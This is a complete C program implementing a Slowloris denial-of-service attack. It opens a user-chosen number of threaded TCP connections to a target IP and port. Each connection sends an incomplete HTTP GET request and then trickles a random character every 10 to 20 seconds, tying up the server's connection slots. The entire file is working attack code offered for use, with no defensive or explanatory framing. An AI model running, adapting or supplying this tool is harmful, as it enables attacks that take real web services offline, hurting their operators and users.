#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h> 
#include <unistd.h>
#include <time.h>
#include <pthread.h>

const char *err_usage = "Usage: ./slowloris <# threads> <ip> <port>";
const char *get_req = "GET /index.html HTTP/1.1 ";

struct arg_bundle{
	char *target_ip;
	unsigned int target_port;
	int thread_num;
};

/*******************************************************************************
 * Input Functions
 ******************************************************************************/



 /*******************************************************************************
 * Util Functions
 ******************************************************************************/

int gen_rand(int lbound, int ubound){
	return rand() % (ubound - lbound + 1) + lbound;
}

char gen_rand8(int lbound, int ubound){
	return rand() % 128 % (ubound - lbound + 1) + lbound;
}

/*******************************************************************************
 * Network Functions
 ******************************************************************************/

void init_socket(int *sock_fd, struct sockaddr_in *server, char *ip, int port){
	//struct hostent *host;

	*sock_fd = socket(AF_INET, SOCK_STREAM, 0);
	if(*sock_fd < 0){
		perror("Creating socket");
		return;
	}

	/*host = gethostbyname(b->target_ip);
	if (host == NULL) {
		perror("Error resolving host");
		exit(1);
	}*/

	server->sin_family = AF_INET;
	server->sin_addr.s_addr = inet_addr(ip);
	server->sin_port = htons(port);
}

/*******************************************************************************
 * Thread Functions
 ******************************************************************************/

void *loris(void *_arg){
	struct arg_bundle *b = (struct arg_bundle*)_arg;
	struct sockaddr_in server;
	int sockfd;

	printf("[%i] started.\n", b->thread_num);

	init_socket(&sockfd, &server, b->target_ip, b->target_port);

	if(connect(sockfd, (struct sockaddr*)&server, sizeof(server)) < 0){
		perror("Error connecting to target");
		return (void*)NULL;
	}

	// Send initial fragment of GET request
	if(send(sockfd, get_req, strlen(get_req), 0) < 0){
		perror("Send");
	}

	while(1){
		char c[2] = { gen_rand(65, 90), '\0', };

		printf("[%i]: sent %s.\n", b->thread_num, c);

		// Send random char
		if(send(sockfd, c, strlen(c), 0) < 0){
			perror("Send");
		}

		sleep((int)gen_rand(10, 20));
	}

	close(sockfd);

	return (void*)NULL;
}

/*******************************************************************************
 * Main
 ******************************************************************************/

int main(int argc, char *argv[]){
	struct arg_bundle *arg_bundles;
	unsigned int num_threads, port_num;
	pthread_t *threads;

	srand(time(NULL));

	// --- Validate and parse arguments 

	if(argc != 4){
		perror(err_usage);
		return EXIT_FAILURE;
	}

	num_threads = atoi(argv[1]);
	if(num_threads <= 0){
		perror(err_usage);
		return EXIT_FAILURE;
	}

	threads = malloc(sizeof(pthread_t) * num_threads);

	port_num = atoi(argv[3]);

	arg_bundles = malloc(sizeof(struct arg_bundle) * num_threads);

	// --- Start

	for(int i = 0; i < num_threads; i++){
		arg_bundles[i].target_ip = argv[2];
		arg_bundles[i].target_port = port_num;
		arg_bundles[i].thread_num = i + 1;

		pthread_create(&threads[i], NULL, loris, (void*)&arg_bundles[i]);
	}

	// --- End

	for(int i = 0; i < num_threads; i++){
		pthread_join(threads[i], NULL);
	}

	return 0;
}